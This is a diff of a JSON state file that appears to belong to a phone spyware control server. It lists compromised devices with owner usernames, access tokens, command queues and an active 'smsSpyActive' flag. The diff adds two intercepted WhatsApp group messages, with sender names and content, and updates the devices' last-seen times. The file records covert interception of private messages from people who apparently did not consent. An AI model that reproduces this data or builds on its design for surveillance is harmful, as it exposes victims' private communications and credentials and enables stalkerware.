@@ -4037,7 +4037,7 @@
     "deviceName": "HP-MEMEM-A001",
     "ownerUsername": "RIXX09",
     "token": "fb008139c6083d4cb9aa61f99b737696",
-    "lastSeen": 1777209954356,
+    "lastSeen": 1777209959332,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:56:32.130Z",
@@ -4053,6 +4053,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Cwe cantik[(/ only 7 members: ~ zlfa",
+        "content": "🎥 Saya menemukan template mengagumkan ini di CapCut. Ketuk tautan untuk mencobanya! https://www.capcut.com/tv2/ZS9r5K2nC/ (0.36)",
+        "time": "26/04 21:26",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777209961092
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Cwe cantik[(/ only 7 members",
+        "content": "~ zlfa: 🎥 Saya menemukan template mengagumkan ini di CapCut. Ketuk tautan untuk mencobanya! https://www.capcut.com/tv2/ZS9r5K2nC/ (0.36)",
+        "time": "26/04 21:25",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777209955233
+      },
       {
         "appName": "WhatsApp",
         "sender": "Cwe cantik[(/ only 7 members: ~ zlfa",
@@ -9249,7 +9265,7 @@
     "deviceName": "HP-RRR-85A1",
     "ownerUsername": "raditcees",
     "token": "d40c7b4bef4b07ee53e2456f723de6fe",
-    "lastSeen": 1777209953546,
+    "lastSeen": 1777209959751,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T07:30:11.065Z",
